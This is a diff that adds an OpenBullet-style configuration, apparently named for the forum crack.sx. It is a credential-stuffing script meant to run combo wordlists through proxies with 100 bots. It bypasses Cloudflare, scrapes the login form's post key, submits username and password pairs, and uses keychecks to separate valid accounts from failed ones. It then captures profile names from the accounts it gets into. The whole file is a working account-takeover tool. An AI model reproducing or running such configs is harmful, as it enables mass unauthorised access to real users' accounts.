@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Crack.sx",
+  "SuggestedBots": 100,
+  "LastModified": "2018-10-09T19:19:31.9543028+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BYPASSCF "https://crack.sx/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+#GET_MAIN_PAGE REQUEST GET "https://crack.sx/index.php" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_LOGIN_PAGE REQUEST GET "https://crack.sx/member.php?action=login" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_POSTKEY PARSE "<SOURCE>" LR "my_post_key\" type=\"hidden\" value=\"" "\"" Recursive=FALSE -> VAR "POSTKEY" "" "" 
+#POST_REQUEST REQUEST POST "https://crack.sx/member.php" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&remember=yes&submit=Login&action=do_login&url=https://crack.sx/index.php&my_post_key=<POSTKEY>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+  KEYCHAIN Success AND 
+    KEY "<COOKIES{*}>" Contains "mybbuser" 
+    KEY "<HEADERS(*)>" Contains "https://crack.sx/index.php" 
+#GET_PROFILE REQUEST GET "https://crack.sx/member.php?action=profile" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTURE_REPUTATION PARSE "<SOURCE>" REGEX "<div class=\"username\">(.*?)</div>" "[1]" Recursive=FALSE -> CAP "Username" "" "" 
